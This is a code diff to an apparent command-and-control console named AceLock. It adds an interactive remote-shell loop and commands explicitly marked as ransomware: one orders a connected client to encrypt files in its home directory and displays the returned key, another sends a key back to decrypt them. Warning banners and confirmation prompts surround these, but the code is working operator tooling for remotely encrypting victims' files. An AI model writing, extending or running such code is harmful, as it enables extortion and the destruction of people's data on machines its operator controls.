@@ -17,8 +17,8 @@ logging.basicConfig(level=logging.INFO,
                     handlers=[logging.FileHandler("commandshell.log"),
                               logging.StreamHandler(sys.stdout)])
 
-# --- Import the FIXED TCPServer ---
-# Ensure 'server.py' contains the corrected TCPServer code provided previously
+
+# Ensure 'server.py' contains the corrected TC
 try:
     from server import TCPServer
 except ImportError:
@@ -36,14 +36,21 @@ except ImportError:
 def intro():
     # (Keep your cool ASCII art intro)
     print("""
-
-█████   ██████ ███████     ██       ██████   ██████ ██   ██
-██   ██ ██      ██          ██      ██    ██ ██      ██  ██
-███████ ██      █████       ██      ██    ██ ██      █████
-██   ██ ██      ██          ██      ██    ██ ██      ██  ██
-██   ██  ██████ ███████     ███████  ██████   ██████ ██   ██
-
-
+        ⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⠟⠻⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⢁⠀⢠⣾⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣾⣿⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⠿⠿⠛⠁⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡿⠋⡉⠀⠀⢀⣤⣶⠀⢹⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀
+⠀⠀⠀⠀⠀⢀⣼⣿⣿⡿⠀⣾⡇⠀⠀⣹⡿⠿⠀⠀⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀
+⠀⠀⠀⠀⢀⣾⣿⣿⣿⣷⡀⢻⣿⣷⠶⣿⠁⠀⠀⡀⢸⣿⣿⣿⣿⠋⠀⠀⠀⠀
+⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣷⣦⠤⠀⠀⢻⣿⣶⣾⠃⣸⣿⣿⡿⠃⠀⠀⠀⠀⠀
+⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣯⣁⠀⠀⣴⣤⣉⣉⣡⣴⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀
+⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠉⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠈⠙⠻⢿⣿⣿⣿⣿⠇⠀⢋⣠⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣿⣄⣠⣾⣿⠃⠀⠀
+                    AceLock by Efeturi Onobrakpeya
     """)
     logging.info("AceLock Command Shell Initialized")
 
@@ -192,6 +199,27 @@ class CommandShell(cmd.Cmd):
             # Clear selection if server stops
             self._clear_current_client() # Use helper
             print("\n[*] Server has stopped. Client selection cleared.")
+
+    def _verify_selected_client_connected(self) -> bool:
+        """Checks if the currently selected client is still in the server's list."""
+        if not self.current_client_address or not self.server_object:
+            # No client selected, or server stopped in meantime
+            return False
+        try:
+            clients_data = self.server_object.get_clients()
+            if self.current_client_address not in clients_data:
+                print("[!] Current client seems to have disconnected. Select another client.")
+                self._clear_current_client()
+                return False
+            # Refresh socket object just in case (unlikely necessary but safe)
+            self.current_client_socket = clients_data[self.current_client_address][0]
+            return True
+        except AttributeError:
+            print("[!] Error accessing server's client getter for verification.")
+            return False
+        except Exception as e:
+            print(f"[!] Error verifying client connection: {e}")
+            return False
 
 
     def do_server_status(self, args):
@@ -444,8 +472,8 @@ class CommandShell(cmd.Cmd):
             if self.current_client_address:
                  self._handle_disconnection(self.current_client_address)
 
-    # Renamed from do_use
-    def do_select_client(self, args):
+    # Renamed to use
+    def do_use(self, args):
         """
         Select a client for interaction by its index. Stores selection locally.
         Usage: select_client <client_index>
@@ -513,6 +541,308 @@ class CommandShell(cmd.Cmd):
             logging.error(f"Error selecting client: {e}", exc_info=True)
             print(f"[!] Error selecting client: {e}")
             self._clear_current_client()
+
+    def _receive_until_prompt_or_done(self, sock, timeout=5.0):
+        """
+        Helper to receive data until a specific condition (like a known end marker
+        from the client for long operations, or just timeout). Returns aggregated bytes
+        or None if disconnection occurs.
+        """
+        if not sock or sock._closed:
+            logging.warning("_receive_until_prompt_or_done called with closed socket.")
+            # Ensure disconnect handler is called if we know the address
+            if self.current_client_address: self._handle_disconnection(self.current_client_address)
+            return None  # Indicate disconnection
+        if not isinstance(sock, socket.socket):
+            logging.error("_receive_all called with non-socket object.")
+            return None
+
+        sock.settimeout(timeout)
+        total_data = b''
+        try:
+            while True:  # Loop until timeout or explicit break
+                chunk = sock.recv(4096)
+                if chunk:
+                    total_data += chunk
+                    # Optional: Check if chunk contains end marker here if client sends one
+                    # e.g., if b'\nCOMMAND_COMPLETE\n' in total_data: break
+                else:
+                    # Socket closed gracefully by peer
+                    logging.info(
+                        f"Socket recv returned empty, peer {sock.getpeername() if not sock._closed else '(closed)'} likely closed connection.")
+                    raise ConnectionResetError("Peer closed connection")
+
+        except socket.timeout:
+            logging.debug(f"Socket timeout after receiving {len(total_data)} bytes in _receive_until_prompt_or_done.")
+            # Timeout is expected way to exit loop when client stops sending (e.g., after command)
+            pass
+        except ConnectionResetError as e:
+            logging.warning(f"ConnectionResetError during _receive_until_prompt_or_done: {e}")
+            print(f"\n[!] Client disconnected: {e}")
+            if self.current_client_address: self._handle_disconnection(self.current_client_address)
+            return None  # Indicate disconnect
+        except (socket.error, ssl.SSLError, OSError) as e:
+            # Distinguish between "closed" errors and others
+            err_str = str(e).lower()
+            if sock._closed or "closed" in err_str or "broken pipe" in err_str or "reset by peer" in err_str:
+                logging.warning(f"Socket error indicates closed connection during receive: {e}")
+                print(f"\n[!] Client disconnected: {e}")
+                if self.current_client_address: self._handle_disconnection(self.current_client_address)
+                return None  # Indicate disconnect
+            else:
+                logging.error(f"Unexpected socket error during receive: {e}")
+                print(f"\n[!] Socket Error: {e}")
+                if self.current_client_address: self._handle_disconnection(self.current_client_address)
+                return None  # Indicate disconnect, as state is unknown
+        finally:
+            try:
+                if sock and not sock._closed: sock.settimeout(None)  # Reset only if still open and valid
+            except (socket.error, OSError, AttributeError):
+                pass  # Ignore errors setting timeout back if sock closed meanwhile
+
+        return total_data
+
+    def _interactive_receive_loop(self, sock, prompt):
+        """Handles the input/output loop for interactive shell mode."""
+        try:
+            while True:
+                # 1. Check for unsolicited data from client (e.g., initial prompt, command output)
+                try:
+                    sock.settimeout(0.1) # Short timeout to check for data
+                    initial_output = sock.recv(8192)
+                    if initial_output:
+                         sys.stdout.write(initial_output.decode('utf-8', errors='replace'))
+                         sys.stdout.flush()
+                    # If recv returns empty b'', peer closed connection
+                    elif initial_output == b'':
+                        raise ConnectionResetError("Peer closed connection during interactive recv.")
+                except socket.timeout:
+                    pass # No data received, proceed to get user input
+                except (ConnectionResetError, ssl.SSLError, socket.error, BrokenPipeError) as e:
+                    # Handle errors during initial check
+                    print(f"\n[!] Connection error receiving shell data: {e}")
+                    logging.warning(f"Socket error in _interactive_receive_loop (recv): {e}")
+                    self._handle_disconnection(self.current_client_address)
+                    break # Exit loop
+
+                sock.settimeout(None) # Back to blocking for input
+
+                # 2. Get input from user
+                try:
+                     shell_input = input(prompt)
+                except EOFError: # Handle Ctrl+D
+                    print("\n[!] EOF received. Sending 'exit' to remote shell.")
+                    shell_input = "exit"
+
+                # 3. Send user input to client
+                try:
+                    sock.sendall((shell_input + "\n").encode('utf-8'))
+                except (ssl.SSLError, socket.error, BrokenPipeError) as e:
+                     print(f"\n[!] Connection error sending shell command: {e}")
+                     logging.warning(f"Socket error in _interactive_receive_loop (send): {e}")
+                     self._handle_disconnection(self.current_client_address)
+                     break
+
+                # 4. Check if user wants to exit
+                if shell_input.lower().strip() in ["exit", "quit"]:
+                     print("[+] Exiting shell mode.")
+                     # Give client a moment to process exit before shell returns control
+                     sleep(0.2)
+                     # Optionally receive one last chunk of output?
+                     # try:
+                     #     sock.settimeout(0.5)
+                     #     last_output = sock.recv(4096)
+                     #     if last_output:
+                     #          sys.stdout.write(last_output.decode('utf-8', errors='replace'))
+                     #          sys.stdout.flush()
+                     # except socket.timeout: pass
+                     # except: pass # Ignore errors here
+                     break # Exit loop
+
+                # 5. Loop back to check for command output
+
+        except KeyboardInterrupt:
+             print("\n[!] Interrupt received. Sending newline to remote shell (try 'exit' or 'quit' to leave).")
+             try:
+                 sock.sendall(b'\n')
+                 # Recursively call to continue the loop after interrupt
+                 self._interactive_receive_loop(sock, prompt)
+             except (socket.error, ssl.SSLError, BrokenPipeError):
+                  print(f"\n[!] Connection error sending newline after interrupt.")
+                  self._handle_disconnection(self.current_client_address)
+        # Catch potential outer loop exceptions (should be caught inside ideally)
+        except (ConnectionResetError, ssl.SSLError, socket.error, BrokenPipeError) as e:
+             print(f"\n[!] Connection error in interactive shell: {e}")
+             self._handle_disconnection(self.current_client_address)
+        finally:
+             try:
+                  if sock and not sock._closed: sock.settimeout(None)
+             except: pass
+    # --- NEW RANSOMWARE COMMANDS ---
+
+    def do_encrypt_files(self, args):
+        """
+        [DANGEROUS] Instructs the selected client to encrypt files in its home directory.
+        Displays status and the generated encryption key. SAVE THE KEY!
+        Usage: encrypt_files
+        """
+        print("\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!! WARNING !!!!!!_!!!!!!!!!!!!!!!!!!!!!!")
+        print("!!! This command will instruct the client to encrypt files.  !!!")
+        print("!!! This is potentially DESTRUCTIVE and data may be LOST     !!!")
+        print("!!! permanently if the key is lost or errors occur.        !!!")
+        print("!!! USE ONLY ON TEST SYSTEMS YOU ARE WILLING TO WIPE.      !!!")
+        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
+        confirm = input("Type 'CONFIRM' to proceed, anything else to cancel: ")
+        if confirm.strip().upper() != 'CONFIRM':
+            print("[!] Encryption cancelled.")
+            return
+
+        if not self.server_running or not self.server_object:
+            logging.warning("encrypt_files attempted while server not running.")
+            print("[!] Server not running. Use start_server first.")
+            return
+        if not self.current_client_socket or not self.current_client_address:
+            print("[!] No client selected. Use select_client first.")
+            return
+        if not self._verify_selected_client_connected(): return # Use helper
+
+        ip, port = self.current_client_address
+        logging.info(f"Sending ENCRYPT command to {ip}:{port}")
+        print(f"[*] Sending ENCRYPT command to client {ip}:{port}...")
+        print("[*] Waiting for status updates and encryption key...")
+        print("[*] DO NOT INTERRUPT. SAVE THE KEY WHEN PROVIDED.")
+
+        encryption_key = None
+        try:
+            command_to_send = "ENCRYPT\n"
+            self.current_client_socket.sendall(command_to_send.encode('utf-8'))
+
+            # Receive and display status until "COMPLETED" or "KEY:" prefix
+            while True:
+                 # Use helper with long timeout, expecting multiple messages
+                 response_bytes = self._receive_until_prompt_or_done(self.current_client_socket, timeout=600.0) # 10 min timeout?
+
+                 if response_bytes is None: # Disconnect handled by helper
+                      print("[!] Client disconnected during encryption.")
+                      break
+
+                 response = response_bytes.decode('utf-8', errors='replace').strip()
+                 print(f"Client {ip}:{port}: {response}") # Display status
+
+                 # Check for key prefix
+                 if response.startswith("KEY:"):
+                     encryption_key = response[len("KEY:"):].strip()
+                     print("\n!!!!!!!!!!!!!!!!!!!! ENCRYPTION KEY !!!!!!!!!!!!!!!!!!!!")
+                     print(f"!!! Key for {ip}:{port}: {encryption_key}")
+                     print("!!! SAVE THIS KEY IMMEDIATELY AND SECURELY!          !!!")
+                     print("!!! WITHOUT IT, DECRYPTION IS IMPOSSIBLE.          !!!")
+                     print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n")
+                     logging.info(f"Received encryption key from {ip}:{port}: {encryption_key}")
+
+                 # Check for completion message
+                 if response.startswith("COMPLETED:") or response.startswith("FATAL ERROR"):
+                      logging.info(f"Received final status from {ip}:{port} for ENCRYPT.")
+                      if not encryption_key and "COMPLETED" in response:
+                          print("[!] WARNING: Encryption completed but key was not explicitly received in final messages? Check logs.")
+                      break # Exit loop on completion or fatal error
+
+        except (socket.error, ssl.SSLError, BrokenPipeError) as e:
+            print(f"\n[!] Connection error during encryption command with client {ip}:{port}: {e}")
+            logging.error(f"Socket error during encrypt_files for {ip}:{port}: {e}", exc_info=True)
+            self._handle_disconnection(self.current_client_address)
+        except Exception as e:
+            print(f"\n[!] Unexpected error during encryption command: {e}")
+            logging.error(f"Unexpected error in do_encrypt_files for {ip}:{port}: {e}", exc_info=True)
+            if self.current_client_address:
+                 self._handle_disconnection(self.current_client_address)
+        finally:
+             if encryption_key:
+                  print("[+] Encryption process finished or stopped. Ensure you saved the key.")
+             else:
+                  print("[!] Encryption process finished or stopped, but no key was confirmed. Check client logs and previous output carefully.")
+
+
+    def do_decrypt_files(self, args):
+        """
+        [DANGEROUS] Instructs the selected client to decrypt files using the provided key.
+        Usage: decrypt_files <base64_encoded_key>
+        Example: decrypt_files YOUR_SAVED_KEY_HERE
+        """
+        print("\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!! WARNING !!!!!!!!!!!!!!!!!!!!!!!!!!!!")
+        print("!!! This command will instruct the client to decrypt files.  !!!")
+        print("!!! Using the WRONG KEY may CORRUPT files further.         !!!")
+        print("!!! Ensure you have the CORRECT key for this client.       !!!")
+        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
+
+        if not args:
+            print("[!] Usage: decrypt_files <base64_encoded_key>")
+            print("[!] The key is the string provided after running 'encrypt_files'.")
+            return
+
+        key_b64 = args.strip()
+        # Optional: Basic validation of the key format (URL-safe base64)
+        try:
+            key_bytes = base64.urlsafe_b64decode(key_b64)
+            if len(key_bytes) != 32:
+                 print("[!] Invalid key format: Decoded key length is not 32 bytes.")
+                 return
+        except (ValueError, base64.binascii.Error):
+            print("[!] Invalid key format: Not valid URL-safe base64.")
+            return
+
+        confirm = input(f"Type 'CONFIRM' to proceed with decryption using key starting with '{key_b64[:8]}...', anything else to cancel: ")
+        if confirm.strip().upper() != 'CONFIRM':
+            print("[!] Decryption cancelled.")
+            return
+
+        if not self.server_running or not self.server_object:
+            logging.warning("decrypt_files attempted while server not running.")
+            print("[!] Server not running. Use start_server first.")
+            return
+        if not self.current_client_socket or not self.current_client_address:
+            print("[!] No client selected. Use select_client first.")
+            return
+        if not self._verify_selected_client_connected(): return # Use helper
+
+        ip, port = self.current_client_address
+        logging.info(f"Sending DECRYPT command to {ip}:{port} with key {key_b64[:8]}...")
+        print(f"[*] Sending DECRYPT command to client {ip}:{port}...")
+        print("[*] Waiting for status updates...")
+
+        try:
+            command_to_send = f"DECRYPT {key_b64}\n"
+            self.current_client_socket.sendall(command_to_send.encode('utf-8'))
+
+            # Receive and display status until "COMPLETED"
+            while True:
+                 response_bytes = self._receive_until_prompt_or_done(self.current_client_socket, timeout=600.0) # Long timeout
+
+                 if response_bytes is None: # Disconnect handled by helper
+                      print("[!] Client disconnected during decryption.")
+                      break
+
+                 response = response_bytes.decode('utf-8', errors='replace').strip()
+                 print(f"Client {ip}:{port}: {response}") # Display status
+
+                 # Check for completion message
+                 if response.startswith("COMPLETED:") or response.startswith("FATAL ERROR"):
+                      logging.info(f"Received final status from {ip}:{port} for DECRYPT.")
+                      break # Exit loop on completion or fatal error
+
+        except (socket.error, ssl.SSLError, BrokenPipeError) as e:
+            print(f"\n[!] Connection error during decryption command with client {ip}:{port}: {e}")
+            logging.error(f"Socket error during decrypt_files for {ip}:{port}: {e}", exc_info=True)
+            self._handle_disconnection(self.current_client_address)
+        except Exception as e:
+            print(f"\n[!] Unexpected error during decryption command: {e}")
+            logging.error(f"Unexpected error in do_decrypt_files for {ip}:{port}: {e}", exc_info=True)
+            if self.current_client_address:
+                 self._handle_disconnection(self.current_client_address)
+        finally:
+            print("[+] Decryption process finished or stopped.")
+
+
+    # --- END RANSOMWARE COMMANDS ---
 
 
     def do_disconnect_client(self, args):
@@ -820,6 +1150,7 @@ class CommandShell(cmd.Cmd):
         # Clear selection if this was the current client
         if self.current_client_address == client_address:
             self._clear_current_client()
+
 
 
     # --- Command Aliases ---
